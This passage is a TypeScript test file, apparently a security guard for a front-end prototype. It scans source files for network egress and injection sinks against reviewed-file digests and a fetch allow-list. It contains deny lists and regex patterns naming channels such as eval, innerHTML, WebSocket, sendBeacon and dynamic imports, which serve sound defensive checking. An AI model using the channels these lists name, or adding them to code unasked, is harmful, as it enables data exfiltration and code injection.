import { describe, expect, it } from "vitest";
import { parseSync, type ESTree } from "vite";

const productSources = import.meta.glob<string>(["./**/*.{ts,tsx,mts,cts,js,jsx,mjs,cjs}", "./**/*.css", "./**/*.html", "../index.html"], {
  exhaustive: true,
  eager: true,
  import: "default",
  query: "?raw",
});

const formatSources = import.meta.glob<string>(["./**/*.{ts,tsx,mts,cts,js,jsx,mjs,cjs}", "../*.{html,json,md,ts}"], {
  exhaustive: true,
  eager: true,
  import: "default",
  query: "?raw",
});

const transportPath = "./platform/api/mvp-api-client.ts";
const allowedFetchTargets = [
  "/api/mvp/bootstrap?persona=reporter",
  "/api/mvp/bootstrap?persona=engineer",
  "/api/mvp/commands",
] as const;
const explicitTestSetupPath = "./test/setup.ts";
const scriptFileSuffix = /\.(?:[cm]?[jt]s|[jt]sx)$/;
const actualTestFileSuffix = /\.(?:test|spec)\.(?:[cm]?[jt]s|[jt]sx)$/;
const approvedIconProps = 'const common = { fill: "none", stroke: "currentColor", strokeLinecap: "round" as const, strokeLinejoin: "round" as const, strokeWidth: 1.8 };';
const approvedSyntheticSubmitProps = "<SyntheticTicketExperience currentReceipt={ticketRuntime.currentReceipt} onClearReceipt={ticketRuntime.clearReceipt} onPersonaChange={ticketRuntime.setPersona} onSubmit={ticketRuntime.submit}";
const submitComponents: Readonly<Record<string, readonly string[]>> = {
  "./App.tsx": ["SyntheticTicketExperience", "ActivityTimeline"],
  "./capabilities/tickets/SyntheticTicketExperience.tsx": ["TicketLifecycleCard"],
  "./capabilities/tickets/TicketTimeline.tsx": ["ActivityTimeline"],
  "./features/timeline/ActivityTimeline.tsx": ["StructuredCard"],
  "./features/cards/StructuredCard.tsx": ["Renderer"],
};
const computedDataReads: Readonly<Record<string, readonly string[]>> = {
  "./App.tsx": ["paths[name]"],
  "./capabilities/tickets/SyntheticTicketExperience.tsx": ["SYNTHETIC_TICKET_STATUS_LABELS[status]"],
  "./capabilities/tickets/ticket-fixtures.ts": ["SYNTHETIC_TICKET_SLA_BY_STATUS[status]"],
  "./capabilities/tickets/ticket-projection.ts": ["SYNTHETIC_TICKET_STATUS_LABELS[ticket.status]", "SYNTHETIC_TICKET_STATUS_LABELS[event.priorStatus]", "SYNTHETIC_TICKET_STATUS_LABELS[event.resultingStatus]", "SYNTHETIC_TICKET_STATUS_LABELS[receipt.resultingStatus]", "SYNTHETIC_TICKET_STATUS_LABELS[receipt.priorStatus]"],
  "./capabilities/tickets/TicketCanvasPanel.tsx": ["SYNTHETIC_TICKET_STATUS_LABELS[event.priorStatus]", "SYNTHETIC_TICKET_STATUS_LABELS[event.resultingStatus]"],
  "./features/canvas/canvas-registry.tsx": ["CANVAS_REGISTRY[route as PrototypeCanvasRoute]", "CONTEXT_ROUTE_OPTIONS[threadId]"],
  "./features/cards/card-registry.tsx": ["card.fields[field]", "CARD_REGISTRY[`${card.cardType}@${card.cardVersion}` as keyof typeof CARD_REGISTRY]"],
  "./features/threads/workspace-runtime.ts": ["state.receipts[event.actionId]"],
  "./features/timeline/ActivityTimeline.tsx": ["labels[activity.kind]", "receipts[actionId]"],
  "./platform/api/mvp-api-client.ts": ["expected[index]", "expectedPersona[persona]", "errorStatuses[envelope.code]", "errorMessages[value.code]"],
  "./platform/api/mvp-api-errors.ts": ["publicMessages[code]"],
};
// These finite MVP data/registry exceptions bind the entire reviewed source, including lexical bindings.
// A changed file must be reviewed before refreshing its digest; matching an expression's text alone is insufficient.
const reviewedDynamicSources: Readonly<Record<string, string>> = {
  "./App.tsx": "c0e9d23f1b2daf49b8adb83530cd6ca2006725adc368b19ad39473cfe0a08978",
  "./capabilities/tickets/SyntheticTicketExperience.tsx": "aedca0de3ee6adb2c6de7179e58a853c9d68a9e5b4735d94424c8bc6f1cd0e56",
  "./capabilities/tickets/ticket-fixtures.ts": "038226b09d5271d1a0ba3c647ab6ce780cf1ae6e763f0ba8f49eb5ce214d2b68",
  "./capabilities/tickets/ticket-projection.ts": "31571c1873b79a4999283ea28894dfb5a6b4fe6dba18fa46491ed1bb1b1479b6",
  "./capabilities/tickets/TicketCanvasPanel.tsx": "72ebabce18564439792a568d399ddcf90af72816d514abc67c1962195e347271",
  "./features/canvas/canvas-registry.tsx": "0e21ed0ed3a2fe32877f8ea51d113a5eaa3d0b17c6ac752e95b0618c6a660d69",
  "./features/cards/card-registry.tsx": "cd7fefae8ef4d6b97928476be1e579c16f01a05780036d5a8bb3fc06fe7d8ee3",
  "./features/threads/workspace-runtime.ts": "6cc4715281ef6fac1936734f765f0a903f165d030a2fb532f6f18df6cfb365d1",
  "./features/timeline/ActivityTimeline.tsx": "8521f0a6bb3bcf9ebac3d29c43dd24daea2460fef702f15983d6f4d832c198c7",
  "./platform/api/mvp-api-client.ts": "7c1b1a2ef0bd96375f4381a3c27510f7d0fe66dcfa30c6160c8efa338b969456",
  "./platform/api/mvp-api-errors.ts": "122d68bd706f8d3c8d6b9ac538a620a0ab33def5301e083b6bfa8ca40eb2dd01",
};

const reviewedDynamicContents = new Map(await Promise.all(Object.entries(reviewedDynamicSources).map(async ([path, digest]) => {
  const source = productSources[path].replaceAll("\r\n", "\n");
  const bytes = await globalThis.crypto.subtle.digest("SHA-256", new TextEncoder().encode(source));
  const actual = Array.from(new Uint8Array(bytes), (byte) => byte.toString(16).padStart(2, "0")).join("");
  return [path, actual === digest ? source : undefined] as const;
})));

function matchesReviewedDynamicSource(path: string, source: string): boolean {
  return reviewedDynamicContents.get(path) === source.replaceAll("\r\n", "\n");
}
const intrinsicElements = new Set("article aside b br button circle dd div dl dt fieldset h1 h2 h3 h4 header input kbd label legend li main nav ol option p path rect section select small span strong svg time ul".split(" "));
const dangerousMembers = new Set("fetch XMLHttpRequest WebSocket WebTransport EventSource sendBeacon postMessage importScripts Function AsyncFunction GeneratorFunction AsyncGeneratorFunction eval constructor __proto__ Reflect innerHTML outerHTML insertAdjacentHTML setHTML setHTMLUnsafe parseHTML parseHTMLUnsafe createContextualFragment DOMParser setAttribute setAttributeNS setAttributeNode setAttributeNodeNS setNamedItem setNamedItemNS appendChild append prepend before after insertNode replaceChildren replaceWith insertBefore replaceChild insertAdjacentElement attachShadow cloneNode style cssText src srcSet href xlinkHref poster srcDoc formAction action data submit requestSubmit createElement cloneElement createPortal jsx jsxs jsxDEV preload preloadModule preinit preinitModule preconnect prefetchDNS".split(" "));
const domMembers = new Set("innerHTML outerHTML insertAdjacentHTML setHTML setHTMLUnsafe parseHTML parseHTMLUnsafe createContextualFragment setAttribute setAttributeNS setAttributeNode setAttributeNodeNS setNamedItem setNamedItemNS appendChild append prepend before after insertNode replaceChildren replaceWith insertBefore replaceChild insertAdjacentElement attachShadow cloneNode postMessage".split(" "));

function isProductionSourcePath(path: string): boolean {
  const normalizedPath = path.replaceAll("\\", "/");
  const basename = normalizedPath.slice(normalizedPath.lastIndexOf("/") + 1);
  return normalizedPath !== explicitTestSetupPath && !actualTestFileSuffix.test(basename);
}

function normalizeEscapedIdentifiers(source: string): string {
  const decode = (match: string, hexadecimal: string) => {
    const codePoint = Number.parseInt(hexadecimal, 16);
    return codePoint <= 0x10ffff ? String.fromCodePoint(codePoint) : match;
  };
  let normalized = source
    .replace(/\\u\{([0-9a-f]{1,6})\}/gi, decode)
    .replace(/\\u([0-9a-f]{4})/gi, decode)
    .replace(/\\x([0-9a-f]{2})/gi, decode);
  const trivia = String.raw`(?:\s|/\*[\s\S]*?\*/|//[^\r\n]*(?:\r?\n|$))*`;
  const between = trivia + "(?:\\)" + trivia + ")*\\+" + trivia + "(?:\\(" + trivia + ")*";
  const literalJoin = new RegExp("([\"'`])((?:(?!\\1)[^\\\\\\r\\n$])*)\\1" + between + "([\"'`])((?:(?!\\3)[^\\\\\\r\\n$])*)\\3", "g");
  while (true) {
    const folded = normalized.replace(literalJoin, (_match, quote: string, left: string, _rightQuote: string, right: string) => `${quote}${left}${right}${quote}`);
    if (folded === normalized) return normalized;
    normalized = folded;
  }
}

function* syntaxNodes(value: unknown): Generator<ESTree.Node> {
  if (value === null || typeof value !== "object") return;
  if (Array.isArray(value)) {
    for (const entry of value) yield* syntaxNodes(entry);
    return;
  }
  if ("type" in value && typeof value.type === "string") yield value as ESTree.Node;
  for (const entry of Object.values(value)) yield* syntaxNodes(entry);
}

function staticKey(node: ESTree.Node): string | number | undefined {
  if (node.type === "Literal" && (typeof node.value === "string" || typeof node.value === "number")) return node.value;
  if (node.type === "TSAsExpression" || node.type === "TSSatisfiesExpression" || node.type === "TSNonNullExpression" || node.type === "ChainExpression") return staticKey(node.expression);
  if (node.type === "BinaryExpression" && node.operator === "+") {
    const left = staticKey(node.left);
    const right = staticKey(node.right);
    if (left === undefined || right === undefined) return undefined;
    return typeof left === "number" && typeof right === "number" ? left + right : `${left}${right}`;
  }
  if (node.type === "TemplateLiteral") {
    let value = node.quasis[0].value.cooked ?? node.quasis[0].value.raw;
    for (let index = 0; index < node.expressions.length; index += 1) {
      const part = staticKey(node.expressions[index]);
      if (part === undefined) return undefined;
      value += `${part}${node.quasis[index + 1].value.cooked ?? node.quasis[index + 1].value.raw}`;
    }
    return value;
  }
  return undefined;
}

function syntaxParents(nodes: readonly ESTree.Node[]): Map<ESTree.Node, ESTree.Node> {
  const parents = new Map<ESTree.Node, ESTree.Node>();
  for (const node of nodes) {
    for (const value of Object.values(node)) {
      for (const child of Array.isArray(value) ? value : [value]) {
        if (child !== null && typeof child === "object" && "type" in child) parents.set(child as ESTree.Node, node);
      }
    }
  }
  return parents;
}

function mutationOrCall(node: ESTree.Node, parents: ReadonlyMap<ESTree.Node, ESTree.Node>): boolean {
  let value = node;
  let parent = parents.get(value);
  while (parent && ["TSAsExpression", "TSSatisfiesExpression", "TSNonNullExpression", "ChainExpression"].includes(parent.type)) {
    value = parent;
    parent = parents.get(value);
  }
  return !!parent && ((parent.type === "AssignmentExpression" && parent.left === value)
    || (parent.type === "UpdateExpression" && parent.argument === value)
    || ((parent.type === "CallExpression" || parent.type === "NewExpression") && parent.callee === value)
    || (parent.type === "UnaryExpression" && parent.operator === "delete" && parent.argument === value));
}

function resolveScannedImport(path: string, specifier: string, sources: Readonly<Record<string, string>>): string | undefined {
  if (!specifier.startsWith(".") || /[?#]/.test(specifier)) return undefined;
  const parts: string[] = [];
  for (const part of [...path.split("/").slice(0, -1), ...specifier.split("/")]) {
    if (part === ".") continue;
    if (part === ".." && parts.length && parts.at(-1) !== "..") parts.pop();
    else parts.push(part);
  }
  if (parts[0] === "..") return undefined;
  const base = `./${parts.join("/")}`;
  return [base, ...[".ts", ".tsx", ".mts", ".cts", ".js", ".jsx", ".mjs", ".cjs"].flatMap((extension) => [base + extension, `${base}/index${extension}`])]
    .find((candidate) => Object.hasOwn(sources, candidate) && isProductionSourcePath(candidate));
}

function patternNames(node: ESTree.Node): string[] {
  if (node.type === "Identifier") return [node.name];
  if (node.type === "AssignmentPattern") return patternNames(node.left);
  if (node.type === "RestElement") return patternNames(node.argument);
  if (node.type === "ArrayPattern") return node.elements.flatMap((entry) => entry ? patternNames(entry) : []);
  if (node.type === "ObjectPattern") return node.properties.flatMap((entry) => patternNames(entry.type === "RestElement" ? entry.argument : entry.value));
  return [];
}

function componentBindings(path: string, nodes: readonly ESTree.Node[], sources: Readonly<Record<string, string>>): Set<string> {
  const bindings = new Map<string, ESTree.Node[]>();
  const add = (names: string[], node: ESTree.Node) => {
    for (const name of names) bindings.set(name, [...(bindings.get(name) ?? []), node]);
  };
  for (const node of nodes) {
    if (node.type === "VariableDeclarator") add(patternNames(node.id), node);
    if (node.type === "FunctionDeclaration" || node.type === "FunctionExpression" || node.type === "ArrowFunctionExpression") {
      if (node.type !== "ArrowFunctionExpression" && node.id) add([node.id.name], node);
      for (const parameter of node.params) add(patternNames(parameter), parameter);
    }
    if (node.type === "ImportSpecifier" || node.type === "ImportDefaultSpecifier" || node.type === "ImportNamespaceSpecifier") add([node["local"].name], node);
    if (node.type === "CatchClause" && node.param) add(patternNames(node.param), node.param);
    if (node.type === "AssignmentExpression") add(patternNames(node.left), node);
    if (node.type === "UpdateExpression") add(patternNames(node.argument), node);
  }
  const parents = syntaxParents(nodes);
  const callable = (node: ESTree.Node | null | undefined) => node?.type === "FunctionDeclaration" || node?.type === "FunctionExpression" || node?.type === "ArrowFunctionExpression";
  const verified = new Set<string>();
  for (const [name, declarations] of bindings) {
    if (declarations.length !== 1) continue;
    const declaration = declarations[0];
    if (callable(declaration) || (declaration.type === "VariableDeclarator" && callable(declaration.init))) verified.add(name);
    if (declaration.type === "ImportSpecifier") {
      const owner = parents.get(declaration);
      if (owner?.type !== "ImportDeclaration") continue;
      const imported = declaration.imported.type === "Identifier" ? declaration.imported.name : String(declaration.imported.value);
      if (owner.source.value === "react" && imported === "StrictMode") verified.add(name);
      const resolved = resolveScannedImport(path, String(owner.source.value), sources);
      if (!resolved) continue;
      const exportedProgram = parseSync(resolved, sources[resolved]).program;
      const exports = exportedProgram.body;
      const mutated = [...syntaxNodes(exportedProgram)].some((entry) => (entry.type === "AssignmentExpression" && patternNames(entry.left).includes(imported))
        || (entry.type === "UpdateExpression" && patternNames(entry.argument).includes(imported)));
      if (mutated) continue;
      if (exports.some((entry) => entry.type === "ExportNamedDeclaration" && ((entry.declaration?.type === "FunctionDeclaration" && entry.declaration.id?.name === imported)
        || (entry.declaration?.type === "VariableDeclaration" && entry.declaration.declarations.some((item) => item.id.type === "Identifier" && item.id.name === imported && callable(item.init)))))) verified.add(name);
    }
    // These two existing registries return locally declared, scanned function components.
    if (declaration.type === "VariableDeclarator" && declaration.init?.type === "CallExpression" && declaration.init.callee.type === "Identifier") {
      const factory = declaration.init.callee.name;
      const expected = path === "./features/cards/StructuredCard.tsx" && name === "Renderer" ? ["registeredCardRenderer", "./card-registry"]
        : path === "./features/canvas/CanvasPanel.tsx" && name === "View" ? ["registeredCanvasView", "./canvas-registry"] : undefined;
      const factoryDeclarations = bindings.get(factory);
      const imported = factoryDeclarations?.length === 1 ? factoryDeclarations[0] : undefined;
      const owner = imported && parents.get(imported);
      if (expected && factory === expected[0] && imported?.type === "ImportSpecifier" && imported.imported.type === "Identifier"
        && imported.imported.name === factory && owner?.type === "ImportDeclaration" && owner.source.value === expected[1]) {
        const resolved = resolveScannedImport(path, expected[1], sources);
        if (resolved && matchesReviewedDynamicSource(resolved, sources[resolved])) verified.add(name);
      }
    }
  }
  return verified;
}

function jsxOpeningTags(source: string, program: ESTree.Program | undefined): { name: string; attributes: string; names: string[]; spreads: string[]; node: ESTree.JSXOpeningElement }[] {
  const tags: { name: string; attributes: string; names: string[]; spreads: string[]; node: ESTree.JSXOpeningElement }[] = [];
  for (const node of syntaxNodes(program)) {
    if (node.type === "JSXOpeningElement") {
      tags.push({
        name: source.slice(node.name.start, node.name.end),
        attributes: node.attributes.map((attribute) => source.slice(attribute.start, attribute.end)).join(" "),
        names: node.attributes.filter((attribute) => attribute.type === "JSXAttribute").map((attribute) => source.slice(attribute.name.start, attribute.name.end)),
        spreads: node.attributes.filter((attribute) => attribute.type === "JSXSpreadAttribute").map((attribute) => source.slice(attribute.start, attribute.end)),
        node,
      });
    }
  }
  return tags;
}

function htmlOpeningTags(source: string): { name: string; attributes: string }[] {
  const tags: { name: string; attributes: string }[] = [];
  for (const match of source.matchAll(/<\s*([A-Za-z][\w$.:-]*)\s+/g)) {
    const start = match.index + match[0].length;
    let end = source.length;
    let quote = "";
    let braces = 0;
    for (let index = start; index < source.length; index += 1) {
      const character = source[index];
      if (quote) {
        if (character === "\\") index += 1;
        else if (character === quote) quote = "";
      } else if (braces > 0 && source.startsWith("/*", index)) {
        const close = source.indexOf("*/", index + 2);
        index = close === -1 ? source.length : close + 1;
      } else if (braces > 0 && source.startsWith("//", index)) {
        const close = source.indexOf("\n", index + 2);
        index = close === -1 ? source.length : close;
      } else if (braces > 0 && character === "/" && source[index + 1] !== ">" && source[index - 1] !== "<") {
        // Conservatively consume regex literals; ambiguous division retains the remaining source below.
        let inClass = false;
        index += 1;
        for (; index < source.length; index += 1) {
          if (source[index] === "\\") index += 1;
          else if (source[index] === "[") inClass = true;
          else if (source[index] === "]") inClass = false;
          else if (source[index] === "/" && !inClass) break;
        }
      } else if (character === '"' || character === "'" || character === "`") {
        quote = character;
      } else if (character === "{") {
        braces += 1;
      } else if (character === "}") {
        braces -= 1;
      } else if (character === ">" && braces === 0) {
        end = index;
        break;
      }
    }
    // Never omit an uncertain opening tag and silently lose a later spread/resource prop.
    tags.push({ name: match[1], attributes: source.slice(start, end) });
  }
  return tags;
}

function inspectStylesheetSource(source: string): string[] {
  const normalized = source
    .replace(/\\(?:\r\n|[\n\r\f])/g, "")
    .replace(/\\([0-9a-f]{1,6})(?:\r\n|[\t\n\r\f ])?|\\([^0-9a-f])/gi, (_match, hexadecimal: string | undefined, escaped: string | undefined) => {
      if (hexadecimal === undefined) return escaped ?? "";
      const codePoint = Number.parseInt(hexadecimal, 16);
      return codePoint > 0 && codePoint <= 0x10ffff ? String.fromCodePoint(codePoint) : "\ufffd";
    })
    .replace(/\/\*[\s\S]*?\*\//g, "");
  return /@import\b|\b(?:url|(?:-webkit-)?image-set|src)\s*\(/i.test(normalized)
    ? ["disallowed stylesheet resource"] : [];
}

const moduleEntry = '<script type="module" src="/src/main.tsx"></script>';

function inspectHtmlSource(path: string, source: string): string[] {
  const body = path === "../index.html" ? source.replace(moduleEntry, "") : source;
  const violations = inspectNetworkSource(path, body).violations;
  if (path === "../index.html" && source.split(moduleEntry).length !== 2) violations.push("invalid module entry");
  if (path === "../index.html") {
    const document = new DOMParser().parseFromString(source, "text/html");
    const scripts = document.querySelectorAll("script");
    if (scripts.length !== 1 || scripts[0].outerHTML !== moduleEntry
      || scripts[0].namespaceURI !== "http://www.w3.org/1999/xhtml"
      || scripts[0].closest("template, noscript")) violations.push("inactive or invalid module entry");
  }
  if (/<\s*script\b|\bhttp-equiv\b|\bon[a-z]+\s*=/i.test(body)) violations.push("unregistered HTML execution or navigation");
  const allowedElements = new Set(["html", "head", "meta", "title", "body", "div"]);
  const allowedAttributes = new Set(["lang", "charset", "name", "content", "id"]);
  for (const match of body.matchAll(/<\s*([a-z][\w:-]*)\b/gi)) {
    if (!allowedElements.has(match[1].toLowerCase())) violations.push("unregistered HTML element");
  }
  for (const tag of htmlOpeningTags(body)) {
    for (const match of tag.attributes.matchAll(/([a-z][\w:-]*)(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?/gi)) {
      if (!allowedAttributes.has(match[1].toLowerCase())) violations.push("unregistered HTML attribute");
    }
  }
  return violations;
}

function inspectNetworkSource(path: string, source: string, sources: Readonly<Record<string, string>> = productSources) {
  const inspectedSource = normalizeEscapedIdentifiers(source);
  const violations: string[] = inspectStylesheetSource(inspectedSource);
  const syntax = path.endsWith(".html") ? undefined : parseSync(path, source);
  if (syntax?.errors.length) violations.push("unparseable browser script");
  const nodes = [...syntaxNodes(syntax?.program)];
  const parents = syntaxParents(nodes);
  const reviewedDynamicSource = matchesReviewedDynamicSource(path, source);
  for (const node of nodes) {
    if (node.type === "Property" && node.computed && !reviewedDynamicSource) {
      const key = staticKey(node.key);
      if (key === undefined || (typeof key === "string" && dangerousMembers.has(key))) violations.push("unregistered computed binding or property");
    }
    if (node.type === "ImportDeclaration" || node.type === "ExportNamedDeclaration" || node.type === "ExportAllDeclaration") {
      const specifier = node.source?.value;
      if (typeof specifier === "string" && specifier.startsWith(".") && !resolveScannedImport(path, specifier, sources)) violations.push("import outside scanned production source");
    }
    if (node.type === "ImportExpression") violations.push("dynamic browser import");
    if (node.type === "MetaProperty" && node.meta.name === "import"
      && !(path === "./App.tsx" && /^import\.meta\.env\.DEV\b/.test(source.slice(node.start)))) {
      violations.push("unregistered import.meta access");
    }
    if (node.type === "Identifier" && node.name === "require") violations.push("uninspected require reference");
    if (node.type === "Identifier" && /^(?:localStorage|sessionStorage|indexedDB|serviceWorker|alert|prompt|confirm|CSSStyleSheet)$/.test(node.name)) violations.push("unregistered storage or native surface");
    if (node.type === "ThrowStatement" && !(path === transportPath && reviewedDynamicSource)
      && !(path === "./main.tsx" && source.slice(node.start, node.end) === 'throw new Error("Workspace root is unavailable.");')) violations.push("unregistered thrown value");
    if (node.type === "Identifier" && /^(?:crypto|performance|Date|setInterval)$/.test(node.name)) violations.push("unregistered nondeterministic API");
    if (node.type === "Identifier" && /^(?:__TAURI__|__TAURI_INTERNALS__|chrome|electron|external|webkit|ReactNativeWebView|Windows|console|reportError|postMessage|WebAssembly|cookieStore|caches|showOpenFilePicker|showSaveFilePicker|showDirectoryPicker|CSS|AudioContext|OfflineAudioContext|Notification)$/.test(node.name)) violations.push("unregistered native or logging API");
    if (node.type === "MemberExpression") {
      const key = node.computed ? staticKey(node.property) : node.property.type === "Identifier" ? node.property.name : undefined;
      if (typeof key === "string" && domMembers.has(key)) violations.push("disallowed browser egress: uninspected DOM mutation");
      if (key === "nativeEvent" || key === "view" || key === "postMessage") violations.push("derived browser or messaging access");
      if (typeof key === "string" && /^(?:getRootNode|parentNode|parentElement|ownerDocument|defaultView|contentWindow|contentDocument|write|writeln|execCommand|createNodeIterator|createTreeWalker|setInterval)$/.test(key)) violations.push("derived document mutation or traversal");
      if (typeof key === "string" && /^(?:animate|getAnimations|setKeyframes|sheet|styleSheets|adoptedStyleSheets|insertRule|deleteRule|replaceSync|attributeStyleMap|computedStyleMap|setProperty|reject)$/.test(key)) violations.push("unregistered style or rejection API");
      if (typeof key === "string" && /^(?:attributes|getAttributeNode|getAttributeNodeNS|getNamedItem|getNamedItemNS|nodeValue|textContent|innerText|appendData|replaceData|insertData|deleteData)$/.test(key)
        && !(key === "textContent" && reviewedDynamicSource && !mutationOrCall(node, parents))) violations.push("unregistered attribute or text mutation API");
      if (node.computed) {
        if (mutationOrCall(node, parents)) violations.push("computed mutation or call");
        if (key === undefined && !(reviewedDynamicSource && computedDataReads[path]?.includes(source.slice(node.start, node.end)))) violations.push("unregistered computed property");
        if (typeof key === "string" && dangerousMembers.has(key)) violations.push("computed protected member");
      }
    }
  }
  const importTrivia = String.raw`(?:\s|/\*[\s\S]*?\*/|//[^\r\n]*(?:\r?\n|$))*`;
  const opaqueImport = new RegExp("\\bimport" + importTrivia + "(?:\\*|[\\w$]+(?=" + importTrivia + "(?:,|from\\b)))");
  const namespaceExport = new RegExp("\\bexport" + importTrivia + "\\*");
  const defaultAlias = new RegExp("\\bdefault[\"']?" + importTrivia + "as\\b");
  const dynamicImport = new RegExp("\\bimport" + importTrivia + "\\(");
  if (dynamicImport.test(inspectedSource)) violations.push("dynamic browser import");
  if (opaqueImport.test(inspectedSource) || namespaceExport.test(inspectedSource) || defaultAlias.test(inspectedSource)) {
    violations.push("uninspected namespace or default import");
  }
  const importSpecifier = new RegExp("\\b(?:from|import)" + importTrivia + "[\"']([^\"']+)[\"']", "g");
  for (const match of inspectedSource.matchAll(importSpecifier)) {
    const specifier = match[1].split(/[?#]/, 1)[0];
    if (specifier.startsWith("/")) violations.push("unscanned absolute import");
    if (!specifier.startsWith(".")) {
      if (specifier !== "react" && specifier !== "react-dom/client") violations.push("unregistered external browser import");
      continue;
    }
    const parts: string[] = [];
    for (const part of [...path.split("/").slice(0, -1), ...specifier.split("/")]) {
      if (part === ".") continue;
      if (part === ".." && parts.length > 0 && parts.at(-1) !== "..") parts.pop();
      else parts.push(part);
    }
    const resolved = `./${parts.join("/")}`;
    if (parts[0] === ".." || !isProductionSourcePath(resolved) || resolved === "./test/setup"
      || /\.(?:test|spec)(?:\?|$)/.test(resolved)) violations.push("import outside scanned production source");
  }
  const directCalls: { index: number; target: string }[] = [];
  const directFetch = /(?<![\w$.])\bfetch\s*\(\s*(["'])([^"'\\\r\n]*)\1\s*,/g;
  for (const match of inspectedSource.matchAll(directFetch)) {
    const target = match[2];
    directCalls.push({ index: match.index, target });
    if (path !== transportPath || !allowedFetchTargets.includes(target as (typeof allowedFetchTargets)[number])) {
      violations.push(`disallowed fetch target: ${target}`);
    }
  }
  for (const match of inspectedSource.matchAll(/\bfetch\b/g)) {
    if (!directCalls.some((call) => call.index === match.index)) violations.push("non-literal or indirect fetch");
  }
  if (/https?:\/\/|["']\/\//i.test(inspectedSource)) violations.push("absolute or protocol-relative target");
  for (const match of inspectedSource.matchAll(/\b(XMLHttpRequest|WebSocket|WebTransport|EventSource|sendBeacon|Worker|SharedWorker|importScripts|Audio|Image)\b/g)) violations.push(`disallowed transport: ${match[1]}`);
  const allowedConstructors = new Set(["AbortController", "Error", "Promise", "Set", "TextDecoder", "Uint8Array", "URLSearchParams", "WeakSet"]);
  for (const match of inspectedSource.matchAll(/\bnew\s+([A-Za-z_$][\w$]*)\b/g)) {
    if (!allowedConstructors.has(match[1])) violations.push(`disallowed constructor: ${match[1]}`);
  }
  const allowedGlobalReferences = [
    /\bglobalThis\.KeyboardEvent\b/g,
    /\b(?:globalThis|window)\.setTimeout\s*\(\s*\(\)\s*=>/g,
    /\b(?:globalThis|window)\.clearTimeout\s*\(/g,
    /\bwindow\.(?:addEventListener|removeEventListener)\b/g,
    /\bnew URLSearchParams\(window\.location\.search\)\.get\("scenario"\)/g,
    /\bdocument\.(?:getElementById|querySelectorAll)\b/g,
    /\bObject\.(?:hasOwn|keys|values|entries|freeze|fromEntries)\b/g,
  ].flatMap((pattern) => [...inspectedSource.matchAll(pattern)].map((match) => ({ start: match.index, end: match.index + match[0].length })));
  for (const match of inspectedSource.matchAll(/\b(globalThis|window|document|navigator|self|frames|top|parent|history|location|navigation|Object)\b/g)) {
    if (!allowedGlobalReferences.some((reference) => match.index >= reference.start && match.index < reference.end)) {
      violations.push(`disallowed browser-global access: ${match[1]}`);
    }
  }
  for (const match of inspectedSource.matchAll(/\b(setTimeout|clearTimeout)\b/g)) {
    if (!allowedGlobalReferences.some((reference) => match.index >= reference.start && match.index < reference.end)) {
      violations.push(`disallowed timer access: ${match[1]}`);
    }
  }
  const browserEgressPatterns: readonly [RegExp, string][] = [
    [/\b(?:Function|AsyncFunction|GeneratorFunction|AsyncGeneratorFunction|eval|constructor|__proto__|Reflect)\b/g, "dynamic code"],
    // Product DOM creation and mutation stays with React; raw markup/attribute sinks bypass source inspection.
    [/\b(?:innerHTML|outerHTML|insertAdjacentHTML|setHTML|setHTMLUnsafe|parseHTML|parseHTMLUnsafe|createContextualFragment|DOMParser|setAttribute|setAttributeNS|appendChild|append|prepend|replaceChildren|replaceWith|insertBefore|replaceChild|insertAdjacentElement|attachShadow|cloneNode)\b/g, "uninspected DOM mutation"],
    // Styles belong in scanned CSS files; dynamic inline CSS is not statically inspectable.
    [/\b(?:style|cssText)\b/g, "inline style"],
    // Product elements must use the inspected JSX path, including when props or tag names are dynamic.
    [/\b(?:createElement|cloneElement|createPortal|jsx|jsxs|jsxDEV)\b/g, "uninspected element factory"],
    [/\b(?:httpEquiv|http-equiv)\b/gi, "metadata navigation"],
    [/\b(?:preload|preloadModule|preinit|preinitModule|preconnect|prefetchDNS)\b/g, "resource hint"],
    [/\b(?:src|srcSet|href|xlinkHref|poster|srcDoc|formAction)\b["']?\s*(?:[:=]|\])/gi, "resource prop"],
    [/\b(?:globalThis|window|navigator|document)\s*\[/g, "computed browser-global access"],
    [/\bReflect\s*\./g, "reflective browser access"],
    [/\.\s*constructor\s*\(/g, "dynamic constructor access"],
    [/\.(?:ownerDocument|defaultView|contentWindow|contentDocument)\b/g, "derived browser-global access"],
    [/\bnew\s+Image\s*\(/g, "image request"],
    [/<\s*(?:a|audio|embed|form|iframe|image|img|link|object|script|source|track|use|video)\s+(?=[A-Za-z_:{])/gi, "resource-bearing markup"],
    [/\bdocument\.createElement\s*\(\s*["'](?:a|audio|embed|form|iframe|image|img|link|object|script|source|track|video)["']\s*\)/gi, "resource-bearing element"],
    [/(?:\.|\]\s*)(?:src|href|action|data|poster|srcdoc)\s*=/g, "resource target assignment"],
    [/\bsetAttribute\s*\(\s*["'](?:src|href|action|data|poster|srcdoc)["']\s*,/g, "resource target attribute"],
    [/\burl\s*\(/gi, "CSS resource target"],
    [/(?<![\w$-])open(?![\w$-])/g, "window navigation"],
    [/\b(?:window\.)?location\.(?:assign|replace)\s*\(/g, "location navigation"],
    [/\b(?:window\.)?location(?:\.href)?\s*=/g, "location assignment"],
    [/\b(?:requestSubmit|submit)\s*\(/g, "form submission"],
    [/\bObject\s*\.\s*assign\b/g, "uninspected object mutation"],
  ];
  for (const [pattern, label] of browserEgressPatterns) {
    if (pattern.test(inspectedSource)) violations.push(`disallowed browser egress: ${label}`);
  }
  const syntheticSubmitBinding = 'const ticketRuntime = useSyntheticTicketRuntime(initialTicket, scenario, runtime.selectedThreadId ?? "no-thread");';
  const formSource = path === "./App.tsx" && inspectedSource.includes(syntheticSubmitBinding)
    ? inspectedSource.replace(approvedSyntheticSubmitProps, "") : inspectedSource;
  if (/(?:\.\s*(?:requestSubmit|submit)\b|\[\s*["'`](?:requestSubmit|submit)["'`]\s*\])/.test(formSource)) {
    violations.push("disallowed browser egress: indirect form submission");
  }
  const fixedIconProps = path === "./App.tsx" && inspectedSource.includes(approvedIconProps)
    && !/\bcommon\b/.test(inspectedSource.replace(approvedIconProps, "").replaceAll("{...common}", ""));
  const components = componentBindings(path, nodes, sources);
  for (const tag of jsxOpeningTags(source, syntax?.program)) {
    if (/^[a-z]/.test(tag.name) && !intrinsicElements.has(tag.name)) violations.push("unregistered intrinsic JSX element");
    if ((tag.node.name.type !== "JSXIdentifier" || !/^[a-z]/.test(tag.name)) && !components.has(tag.name)) violations.push("unverified JSX component binding");
    if (tag.names.includes("onSubmit") && !submitComponents[path]?.includes(tag.name)) {
      violations.push("disallowed browser egress: unregistered submit callback");
    }
